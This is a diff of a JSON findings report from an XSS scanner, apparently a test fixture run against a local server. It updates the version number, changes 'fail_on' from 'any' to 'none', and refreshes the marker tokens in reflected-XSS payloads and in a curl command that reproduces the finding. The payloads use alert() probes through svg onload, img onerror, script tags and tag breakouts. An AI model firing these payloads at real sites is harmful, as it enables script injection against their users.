@@ -1,7 +1,7 @@
 {
   "tool": "SV1",
   "author": "ee.zvz",
-  "version": "1.3.0",
+  "version": "1.3.1",
   "meta": {
     "target": "http://127.0.0.1:8099/xhr-post",
     "crawl": false,
@@ -28,7 +28,7 @@
     "blind": false,
     "ssrf": false,
     "oob": "",
-    "fail_on": "any",
+    "fail_on": "none",
     "scope": "",
     "db": "",
     "sarif": "",
@@ -61,20 +61,20 @@
       "url": "http://127.0.0.1:8099/api/xhr",
       "method": "POST",
       "param": "user.name",
-      "payload": "<svg/onload=alert('sv106365d21')>sv106365d21",
+      "payload": "<svg/onload=alert('sv1f0f01ca4')>sv1f0f01ca4",
       "confidence": "MEDIUM",
-      "evidence": "<html><body><h1>api body</h1><div><svg/onload=alert('sv106365d21')>sv106365d21</div></body></html>",
+      "evidence": "<html><body><h1>api body</h1><div><svg/onload=alert('sv1f0f01ca4')>sv1f0f01ca4</div></body></html>",
       "technique": "reflected/text",
       "detail": "reflection confirmed; execution not yet proven (in HTML text flow) | browser proof unavailable for json inputs",
       "artifact": "",
-      "curl": "curl -sS -X POST -H 'Content-Type: application/json' --data-raw '{\"user\":{\"name\":\"<svg/onload=alert('\"'\"'sv106365d21'\"'\"')>sv106365d21\"},\"q\":\"hello\"}' http://127.0.0.1:8099/api/xhr",
+      "curl": "curl -sS -X POST -H 'Content-Type: application/json' --data-raw '{\"user\":{\"name\":\"<svg/onload=alert('\"'\"'sv1f0f01ca4'\"'\"')>sv1f0f01ca4\"},\"q\":\"hello\"}' http://127.0.0.1:8099/api/xhr",
       "data": {},
       "alternatives": [
-        "<img src=x onerror=alert('sv106365d21')>sv106365d21",
-        "<script>alert('sv106365d21')</script>sv106365d21",
-        "sv106365d21\"><svg/onload=alert('sv106365d21')>",
-        "sv106365d21'><svg/onload=alert('sv106365d21')>",
-        "sv106365d21</title><svg/onload=alert('sv106365d21')>"
+        "<img src=x onerror=alert('sv1f0f01ca4')>sv1f0f01ca4",
+        "<script>alert('sv1f0f01ca4')</script>sv1f0f01ca4",
+        "sv1f0f01ca4\"><svg/onload=alert('sv1f0f01ca4')>",
+        "sv1f0f01ca4'><svg/onload=alert('sv1f0f01ca4')>",
+        "sv1f0f01ca4</title><svg/onload=alert('sv1f0f01ca4')>"
       ]
     }
   ]
